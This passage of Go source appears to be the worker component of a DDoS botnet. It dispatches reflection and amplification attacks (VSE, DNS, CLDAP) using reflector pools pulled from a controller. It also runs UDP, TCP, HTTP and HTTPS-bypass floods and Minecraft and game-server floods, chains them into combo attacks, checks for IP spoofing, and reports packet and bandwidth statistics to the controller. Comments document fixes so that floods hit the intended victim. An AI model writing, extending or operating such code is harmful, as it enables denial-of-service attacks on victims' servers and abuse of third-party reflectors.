		Mix:          task.Mix,
		Game:         task.Game,
		RateLimitPPS: task.RateLimitPps,
		RateLimitBPS: task.RateLimitBps,
		BurstMode:    task.BurstMode,
		JitterMs:     int(task.JitterMs),
		CanSpoofIP:   w.canSpoofIP,
	}

	log.Printf("[worker] starting task %s: %s targets=%d", task.TaskId, method, len(targets))

	var session *attack.AttackSession

	switch method {
	case "vse":
		session = attack.StartVSEAttackEx(cfg)
	case "vse_reflector":
		w.fetchReflectorsFromPoolInto(&cfg.Targets, "vse")
		session = attack.StartVSEAmplificationEx(cfg)
	case "dns_reflector":
		w.fetchDNSAmp()
		w.fetchReflectorsFromPoolInto(&cfg.Targets, "dns")
		session = attack.StartDNSAmplificationEx(cfg)
	case "cldap_reflector":
		w.fetchReflectorsFromPoolInto(&cfg.Targets, "cldap")
		session = attack.StartCLDAPAmplificationEx(cfg)
	case "udp_stdhex", "udp_plain", "udp_bypass", "udp_burst":
		session = attack.StartUDPFloodEx(cfg)
	case "tcp_syn", "tcp_ack", "tcp_connect", "tcp_tcpbypass":
		session = attack.StartTCPFloodEx(cfg)
	case "http_flood":
		session = attack.StartHTTPFloodEx(cfg)
	case "https_bypass":
		session = attack.StartHTTPSBypassEx(cfg)
	case "minecraft_handshake", "minecraft_login":
		session = attack.StartMinecraftAttackEx(cfg)
	case "game_udp":
		session = attack.StartGameUDPSpamEx(cfg)
	case "combo":
		w.startComboTask(task)
		return
	default:
		log.Printf("[worker] unknown method: %s", method)
		return
	}

	if session == nil {
		log.Printf("[worker] task %s failed to start (method=%s)", task.TaskId, task.Method)
		return
	}

	w.tasksMu.Lock()
	w.activeTasks[task.TaskId] = session
	w.tasksMu.Unlock()
	go w.streamStats(task.TaskId, session)
}

func (w *Worker) stopTask(taskID string) {
	w.tasksMu.Lock()
	session, ok := w.activeTasks[taskID]
	if ok {
		delete(w.activeTasks, taskID)
	}
	comboSession, comboOk := w.activeComboTasks[taskID]
	if comboOk {
		delete(w.activeComboTasks, taskID)
	}
	w.tasksMu.Unlock()

	if ok {
		log.Printf("[worker] stopping task %s", taskID)
		session.Stop()
	}
	if comboOk {
		log.Printf("[worker] stopping combo task %s", taskID)
		comboSession.Stop()
	}
}

func (w *Worker) getStatsInterval() time.Duration {
	latency := atomic.LoadInt64(&w.lastHeartbeatLatency)
	if latency > 2000 {
		return 2 * time.Second
	}
	if latency > 1000 {
		return 1 * time.Second
	}
	return time.Duration(atomic.LoadInt32(&w.statsIntervalMs)) * time.Millisecond
}

func (w *Worker) streamStats(taskID string, session *attack.AttackSession) {
	defer func() {
		<-session.DoneChan
		w.tasksMu.Lock()
		delete(w.activeTasks, taskID)
		w.tasksMu.Unlock()
	}()

	// stats 流携带 worker token：Controller 端据此认证，
	// 否则任何能连通 gRPC 端口的对端都能伪造统计
	streamCtx := metadata.AppendToOutgoingContext(context.Background(),
		"authorization", "Bearer "+w.authToken)
	stream, err := w.client.ReportStats(streamCtx)
	if err != nil {
		log.Printf("[worker] stats stream error (task %s continues without reporting): %v", taskID, err)
		// 流建不起来但攻击还在跑：等攻击结束后再上报完成
		<-session.DoneChan
		snap := session.Snapshot()
		w.reportCompleteViaHTTP(taskID, snap)
		return
	}

	interval := w.getStatsInterval()
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	done := make(chan struct{})
	go func() {
		<-session.DoneChan
		close(done)
	}()

	adjustTicker := time.NewTicker(3 * time.Second)
	defer adjustTicker.Stop()

	for {
		select {
		case <-done:
			snap := session.Snapshot()
			// 最终完成推送必须检查错误：流恰在完成瞬间断开时
			// 静默丢失会触发 Controller 超时重试、整段重跑任务，
			// 因此失败时补 HTTP fallback
			if err := stream.Send(&pb.WorkerStatsPush{
				TaskId:         taskID,
				WorkerId:       w.assignedID,
				PacketsSent:    snap.PacketsSent,
				BytesSent:      snap.BytesSent,
				Errors:         snap.Errors,
				CurrentPps:     snap.PPS,
				CurrentBps:     snap.BPS,
				ElapsedSeconds: snap.Elapsed,
				Finished:       true,
			}); err != nil {
				w.reportCompleteViaHTTP(taskID, snap)
				log.Printf("[worker] final stats push failed for task %s, fallback to HTTP: %v", taskID, err)
			}
			stream.CloseAndRecv()
			log.Printf("[worker] task %s completed: %d pkts", taskID, snap.PacketsSent)
			return
		case <-adjustTicker.C:
			newInterval := w.getStatsInterval()
			if newInterval != interval {
				interval = newInterval
				ticker.Reset(interval)
			}
		case <-ticker.C:
			snap := session.Snapshot()
			if err := stream.Send(&pb.WorkerStatsPush{
				TaskId:         taskID,
				WorkerId:       w.assignedID,
				PacketsSent:    snap.PacketsSent,
				BytesSent:      snap.BytesSent,
				Errors:         snap.Errors,
				CurrentPps:     snap.PPS,
				CurrentBps:     snap.BPS,
				ElapsedSeconds: snap.Elapsed,
				Finished:       false,
			}); err != nil {
				log.Printf("[worker] stats send failed for task %s, stopping reports: %v", taskID, err)
				// 注意：流失败不能上报"完成"——攻击仍在进行，提前上报会让
				// Controller 误判任务完成而不再跟踪。等攻击真正结束（done）
				// 后再上报完成状态。
				<-done
				log.Printf("[worker] task %s completed (reporting had stopped)", taskID)
				return
			}
		}
	}
}

func (w *Worker) reportCompleteViaHTTP(taskID string, snap attack.AttackSnapshot) {
	url := w.ctrlBaseURL() + "/api/tasks/complete"
	body := fmt.Sprintf(
		`{"task_id":"%s","worker_id":"%s","packets_sent":%d,"bytes_sent":%d,"errors":%d,"current_pps":%d,"current_bps":%d,"elapsed_seconds":%f}`,
		taskID, w.assignedID, snap.PacketsSent, snap.BytesSent, snap.Errors, snap.PPS, snap.BPS, snap.Elapsed,
	)

	// 完成上报失败会触发 Controller 超时重试、整段攻击重跑：
	// 重试 3 次（间隔递增），最大程度保证 Controller 收到完成状态
	for attempt := 1; attempt <= 3; attempt++ {
		req, err := http.NewRequest("POST", url, strings.NewReader(body))
		if err != nil {
			log.Printf("[worker] http fallback build request error: %v", err)
			return
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+w.authToken)
		resp, err := ctrlHTTPClient.Do(req)
		if err != nil {
			log.Printf("[worker] http fallback complete error (attempt %d/3): %v", attempt, err)
			time.Sleep(time.Duration(attempt) * 3 * time.Second)
			continue
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			log.Printf("[worker] http fallback complete http %d (attempt %d/3)", resp.StatusCode, attempt)
			time.Sleep(time.Duration(attempt) * 3 * time.Second)
			continue
		}
		log.Printf("[worker] http fallback: task %s completion reported", taskID)
		return
	}
	log.Printf("[worker] http fallback: task %s completion report FAILED after 3 attempts", taskID)
}

// fetchReflectorsFromPoolInto 优先从本地池获取反射器，失败时 fallback 到 Controller
func (w *Worker) fetchReflectorsFromPoolInto(targets *[]string, game string) {
	// 优先使用本地池（仅当已就绪）
	if w.useLocalPool && w.localPool != nil && w.localPool.IsReady() {
		reflectors := w.localPool.GetReflectors(game, 1000)
		if len(reflectors) > 0 {
			*targets = reflectors
			log.Printf("[reflector] using local pool: %d reflectors (game=%s)", len(reflectors), game)
			return
		}
		log.Printf("[reflector] local pool empty, fallback to controller (game=%s)", game)
	} else if w.useLocalPool && w.localPool != nil && !w.localPool.IsReady() {
		log.Printf("[reflector] local pool not ready, fallback to controller (game=%s)", game)
	}

	// Fallback: 从 Controller 拉取
	w.fetchReflectorsInto(targets, game)
}

func (w *Worker) fetchReflectorsInto(targets *[]string, poolID string) {
	cached := w.getReflectorCache(poolID)
	if len(cached) > 0 {
		*targets = cached
		return
	}

	// 记录当前池版本，供后续缓存校验复用；版本不可得时缓存仍可用（按 TTL 刷新）
	version := ""
	if poolID != "" {
		version = w.fetchPoolVersion(poolID)
	}

	url := w.ctrlBaseURL() + "/api/reflectors/all"
	if poolID != "" {
		url += "?pool=" + poolID
	}

	resp, err := ctrlHTTPClient.Get(url)
	if err != nil {
		log.Printf("[reflector] fetch failed: %v", err)
		return
	}
	defer resp.Body.Close()

	var remoteTargets []string
	if err := json.NewDecoder(resp.Body).Decode(&remoteTargets); err != nil {
		log.Printf("[reflector] decode failed: %v", err)
		return
	}

	w.reflectorCache = remoteTargets
	if poolID != "" {
		w.reflectorVersions[poolID] = version
	}
	w.reflectorLastFetch = time.Now()
	*targets = remoteTargets
	log.Printf("[reflector] loaded %d reflectors from controller (pool=%s version=%s)", len(remoteTargets), poolID, version)
}

func (w *Worker) getReflectorCache(poolID string) []string {
	if len(w.reflectorCache) == 0 {
		return nil
	}
	if poolID != "" && w.reflectorVersions[poolID] == "" {
		// 该池版本从未核对过，无法确认缓存仍与服务端一致
		return nil
	}
	if time.Since(w.reflectorLastFetch) > 5*time.Minute {
		w.refreshReflectorCache(poolID)
	}
	if poolID != "" && w.reflectorVersions[poolID] == "" {
		return nil
	}
	return w.reflectorCache
}

// fetchPoolVersion 查询指定池的服务端版本号；失败返回空串。
func (w *Worker) fetchPoolVersion(poolID string) string {
	versionURL := w.ctrlBaseURL() + "/api/reflectors/version?game=" + poolID

	resp, err := ctrlHTTPClient.Get(versionURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	var v struct {
		Version string `json:"version"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&v); err != nil {
		return ""
	}
	return v.Version
}

func (w *Worker) refreshReflectorCache(poolID string) {
	// 仅对具名池做版本校验：版本一致说明缓存仍有效，刷新时间戳即可；
	// "all"（poolID 为空）直接按 TTL 全量重拉。
	version := ""
	if poolID != "" {
		version = w.fetchPoolVersion(poolID)
		if version == "" {
			return // 版本不可得，保留旧缓存等待下次重试
		}
		if version == w.reflectorVersions[poolID] {
			w.reflectorLastFetch = time.Now()
			return
		}
	}

	allURL := w.ctrlBaseURL() + "/api/reflectors/all"
	if poolID != "" {
		allURL += "?pool=" + poolID
	}
	resp2, err := ctrlHTTPClient.Get(allURL)
	if err != nil {
		return
	}
	defer resp2.Body.Close()

	var targets []string
	if err := json.NewDecoder(resp2.Body).Decode(&targets); err != nil {
		return
	}

	w.reflectorCache = targets
	if poolID != "" {
		w.reflectorVersions[poolID] = version
	}
	w.reflectorLastFetch = time.Now()
	log.Printf("[reflector] cache refreshed: %d targets (pool=%s version=%s)", len(targets), poolID, version)
}

func (w *Worker) autoTuneThreads() {
	// 熔断降级期间不做 CPU 自调优，否则会覆盖 handleHeartbeatFailure
	// 设置的降级带宽，抵消熔断保护。恢复后由 recovery 分支清除 degraded。
	if atomic.LoadInt32(&w.degraded) == 1 {
		return
	}
	cpu := atomic.LoadInt32(&w.lastCPUPercent)
	if cpu == 0 {
		return
	}

	// 无带宽限制时，自动调优无效（scaleAttacks 会直接返回）
	if w.maxBWMbps <= 0 {
		return
	}

	factor := w.autoTuneFactor

	switch {
	case cpu > autoTuneTargetCPU:
		// 比例降级：每超出目标 CPU 1%，带宽因子减 0.05，
		// 只降到刚好能压回 90% 以内，不再固定砍 20% 浪费性能
		over := float64(cpu - autoTuneTargetCPU)
		newFactor := factor - 0.05*over
		if newFactor < autoTuneMinFactor {
			newFactor = autoTuneMinFactor
		}
		if newFactor != factor {
			w.autoTuneFactor = newFactor
			w.lowCPUCounter = 0
			w.scaleAttacks(newFactor)
			log.Printf("[autotune] CPU %d%% > %d%%, factor → %.2f", cpu, autoTuneTargetCPU, newFactor)
		}
	case cpu < autoTuneRecoverCPU && factor < 1.0:
		// 低负载回升：连续 3 次检查（45s）确认稳定后每次升 0.1，直到满速
		w.lowCPUCounter++
		if w.lowCPUCounter >= 3 {
			w.lowCPUCounter = 0
			newFactor := factor + 0.1
			if newFactor > 1.0 {
				newFactor = 1.0
			}
			w.autoTuneFactor = newFactor
			w.scaleAttacks(newFactor)
			log.Printf("[autotune] CPU %d%% < %d%% sustained, factor → %.2f", cpu, autoTuneRecoverCPU, newFactor)
		}
	default:
		// CPU 在 60%-90% 之间：不动，保持当前因子
		w.lowCPUCounter = 0
	}
}

func (w *Worker) scaleAttacks(factor float64) {
	// Note: AttackSession doesn't expose thread count for scaling.
	// Instead, we adjust the global bandwidth limiter as a proxy.
	// This affects all running attacks uniformly.
	if w.maxBWMbps <= 0 {
		// 无带宽限制时，自动调优无意义
		return
	}
	currentBps := int64(float64(w.maxBWMbps) * 125000 * factor)
	if factor < 1.0 && currentBps < 125000 {
		currentBps = 125000 // 最低保持 1 Mbps（原为 100 Mbps 的 12500000，小带宽机器降级反而放大）
	}
	attack.SetGlobalRateLimiter(0, currentBps)
	log.Printf("[autotune] bandwidth limiter adjusted to %s (%.0f%% of %d Mbps)",
		formatBps(currentBps), factor*100, w.maxBWMbps)
}

func parseTargets(target string) []string {
	if !strings.Contains(target, "\n") {
		t := strings.TrimSpace(target)
		if t == "" {
			return nil
		}
		return []string{t}
	}
	var result []string
	for line := range strings.SplitSeq(target, "\n") {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	if len(result) > 0 {
		return result
	}
	return []string{strings.TrimSpace(target)}
}

func gamePrefix(game string) []byte {
	switch strings.ToLower(game) {
	case "pubg":
		return []byte("PUBG")
	case "ark":
		return []byte("ARK")
	case "fortnite":
		return []byte("FORT")
	default:
		return []byte("GAME")
	}
}

func (w *Worker) startComboTask(task *pb.AttackTask) {
	w.tasksMu.Lock()
	_, exists := w.activeComboTasks[task.TaskId]
	w.tasksMu.Unlock()
	if exists {
		return
	}

	targets := parseTargets(task.Target)
	cfg := attack.AttackConfig{
		Target:       task.Target,
		Targets:      targets,
		Method:       task.Method,
		Duration:     int(task.Duration),
		Threads:      int(task.Threads),
		PacketSize:   int(task.PacketSize),
		Mix:          task.Mix,
		Game:         task.Game,
		RateLimitPPS: task.RateLimitPps,
		RateLimitBPS: task.RateLimitBps,
		BurstMode:    task.BurstMode,
		JitterMs:     int(task.JitterMs),
	}

	// 每个子攻击独立取目标池：只有反射器子攻击填入反射器列表，
	// 直接攻击类子攻击保持 Targets=nil（打向 Target 即受害者）。
	// 此前所有子攻击共享一个反射器列表，导致 udp/tcp/http 子攻击
	// 打向反射器而非受害者、dns/cldap 子攻击拿到游戏服列表的错配。
	needDNS := false
	subCfgs := make([]attack.AttackConfig, 0, len(task.SubAttacks))
	for _, sub := range task.SubAttacks {
		subMethod := sub.Method
		// 与单任务一致：不支持伪造时强制降级，避免无效反射攻击
		if !w.canSpoofIP && isReflectorMethod(subMethod) {
			if !task.FallbackToUdp {
				log.Printf("[worker] combo task %s: sub reflector %s but spoof unavailable & fallback off — FORCED fallback to udp_stdhex", task.TaskId, subMethod)
			} else {
				log.Printf("[worker] combo task %s: sub reflector %s → fallback to UDP", task.TaskId, subMethod)
			}
			subMethod = "udp_stdhex"
		}
		subCfg := attack.AttackConfig{
			Method:       subMethod,
			Threads:      int(sub.Threads),
			PacketSize:   int(sub.PacketSize),
			RateLimitPPS: sub.RateLimitPps,
			RateLimitBPS: sub.RateLimitBps,
			Game:         sub.Game,
			BurstMode:    sub.BurstMode,
			JitterMs:     int(sub.JitterMs),
			CanSpoofIP:   w.canSpoofIP,
		}
		// 子攻击未单独限速时继承 combo 顶层限速，避免顶层配置被静默忽略
		if subCfg.RateLimitPPS <= 0 && task.RateLimitPps > 0 {
			subCfg.RateLimitPPS = task.RateLimitPps
		}
		if subCfg.RateLimitBPS <= 0 && task.RateLimitBps > 0 {
			subCfg.RateLimitBPS = task.RateLimitBps
		}
		switch subMethod {
		case "vse_reflector":
			w.fetchReflectorsFromPoolInto(&subCfg.Targets, "vse")
		case "dns_reflector":
			needDNS = true
			w.fetchReflectorsFromPoolInto(&subCfg.Targets, "dns")
		case "cldap_reflector":
			w.fetchReflectorsFromPoolInto(&subCfg.Targets, "cldap")
		}
		subCfgs = append(subCfgs, subCfg)
	}

	if needDNS {
		w.fetchDNSAmp()
	}

	log.Printf("[worker] starting combo task %s with %d sub-attacks", task.TaskId, len(subCfgs))
	for i, s := range subCfgs {
		log.Printf("[worker]   sub-%d: %s threads=%d targets=%d", i, s.Method, s.Threads, len(s.Targets))
	}

	session := attack.StartComboAttack(cfg, subCfgs)
	w.tasksMu.Lock()
	w.activeComboTasks[task.TaskId] = session
	w.tasksMu.Unlock()
	go w.streamComboStats(task.TaskId, session)
}

func (w *Worker) streamComboStats(taskID string, session *attack.ComboSession) {
	// 无论何种路径退出都必须清理 map 条目，否则该任务永远无法重启
	defer func() {
		w.tasksMu.Lock()
		delete(w.activeComboTasks, taskID)
		w.tasksMu.Unlock()
	}()

	// stats 流携带 worker token：Controller 端据此认证
	streamCtx := metadata.AppendToOutgoingContext(context.Background(),
		"authorization", "Bearer "+w.authToken)
	stream, err := w.client.ReportStats(streamCtx)
	if err != nil {
		log.Printf("[worker] combo stats stream error: %v", err)
		// 攻击仍在进行：等真正结束后再上报完成
		<-session.DoneChan
		snap := session.Snapshot()
		w.reportCompleteViaHTTP(taskID, snap)
		return
	}

	interval := w.getStatsInterval()
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	done := make(chan struct{})
	go func() {
		<-session.DoneChan
		close(done)
	}()

	adjustTicker := time.NewTicker(3 * time.Second)
	defer adjustTicker.Stop()

	for {
		select {
		case <-done:
			snap := session.Snapshot()
			// 最终完成推送必须检查错误：失败时补 HTTP fallback，
			// 防止流断开导致 Controller 超时重试整段重跑
			if err := stream.Send(&pb.WorkerStatsPush{
				TaskId:         taskID,
				WorkerId:       w.assignedID,
				PacketsSent:    snap.PacketsSent,
				BytesSent:      snap.BytesSent,
				Errors:         snap.Errors,
				CurrentPps:     snap.PPS,
				CurrentBps:     snap.BPS,
				ElapsedSeconds: snap.Elapsed,
				Finished:       true,
			}); err != nil {
				w.reportCompleteViaHTTP(taskID, snap)
				log.Printf("[worker] combo final stats push failed for task %s, fallback to HTTP: %v", taskID, err)
			}
			stream.CloseAndRecv()
			log.Printf("[worker] combo task %s completed: %d pkts", taskID, snap.PacketsSent)
			return
		case <-adjustTicker.C:
			newInterval := w.getStatsInterval()
			if newInterval != interval {
				interval = newInterval
				ticker.Reset(interval)
			}
		case <-ticker.C:
			snap := session.Snapshot()
			if err := stream.Send(&pb.WorkerStatsPush{
				TaskId:         taskID,
				WorkerId:       w.assignedID,
				PacketsSent:    snap.PacketsSent,
				BytesSent:      snap.BytesSent,
				Errors:         snap.Errors,
				CurrentPps:     snap.PPS,
				CurrentBps:     snap.BPS,
				ElapsedSeconds: snap.Elapsed,
				Finished:       false,
			}); err != nil {
				log.Printf("[worker] combo stats send failed for task %s, stopping reports: %v", taskID, err)
				// 注意：不能提前上报完成——攻击仍在进行。
				// 等任务真正结束后（done）再上报完成状态。
				<-done
				log.Printf("[worker] combo task %s completed (reporting had stopped)", taskID)
				return
			}
		}
	}
}

func isReflectorMethod(method string) bool {
	switch method {
	case "vse_reflector", "dns_reflector", "cldap_reflector":
		return true
	default:
		return false
	}
}
